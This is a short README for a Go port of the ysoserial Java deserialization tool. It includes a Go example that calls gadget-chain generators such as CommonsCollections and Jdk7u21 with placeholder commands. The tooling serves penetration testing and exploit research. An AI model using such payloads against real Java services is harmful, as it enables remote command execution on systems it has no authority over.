![](https://socialify.git.ci/nu1r/GlangYsoserial.java/image?font=Raleway&language=1&logo=https%3A%2F%2Fs1.ax1x.com%2F2022%2F09%2F12%2FvXqOUI.jpg&name=1&owner=1&pattern=Signal&theme=Light)
当用GO写JAVA反序列化EXP的时候, 每次都要重写生成,调用不方便时, 可以使用本库

使用方法示例
```go
package main

import (
	"encoding/hex"
	"fmt"
        "github.com/nu1r/GlangYsoserial"
)

func main() {
    // 如果你需要使用使用 TemplatesImpl 类实现的Gadget, 但是又懒得去JAVA实现后输出，可以调用 TemplatesImpl 函数的返回值作为参数
    fmt.Println(hex.Dump(ysoserial.TemplatesImpl("example command")))
    
    fmt.Println(hex.Dump(ysoserial.URLDNS("example domain")))
    fmt.Println(hex.Dump(ysoserial.CommonsBeanutils1([]byte("example bytes"))))
    fmt.Println(hex.Dump(ysoserial.CommonsBeanutils2([]byte("example bytes"))))
    fmt.Println(hex.Dump(ysoserial.CommonsCollections1("example command")))
    fmt.Println(hex.Dump(ysoserial.CommonsCollections2([]byte("example bytes"))))
    fmt.Println(hex.Dump(ysoserial.CommonsCollections3([]byte("example bytes"))))
    fmt.Println(hex.Dump(ysoserial.CommonsCollections4([]byte("example bytes"))))
    fmt.Println(hex.Dump(ysoserial.CommonsCollections5("example command")))
    fmt.Println(hex.Dump(ysoserial.CommonsCollections6("example command")))
    fmt.Println(hex.Dump(ysoserial.CommonsCollections7("example command")))
    fmt.Println(hex.Dump(ysoserial.CommonsCollections8([]byte("example bytes"))))
    fmt.Println(hex.Dump(ysoserial.CommonsCollections9("example command")))
    fmt.Println(hex.Dump(ysoserial.CommonsCollections10([]byte("example bytes"))))
    fmt.Println(hex.Dump(ysoserial.CommonsCollections11("example command")))
    fmt.Println(hex.Dump(ysoserial.CommonsCollectionsK1([]byte("example bytes"))))
    fmt.Println(hex.Dump(ysoserial.CommonsCollectionsK2([]byte("example bytes"))))
    fmt.Println(hex.Dump(ysoserial.Jdk7u21([]byte("example bytes"))))
    fmt.Println(hex.Dump(ysoserial.Jdk8u20([]byte("example bytes"))))
}

```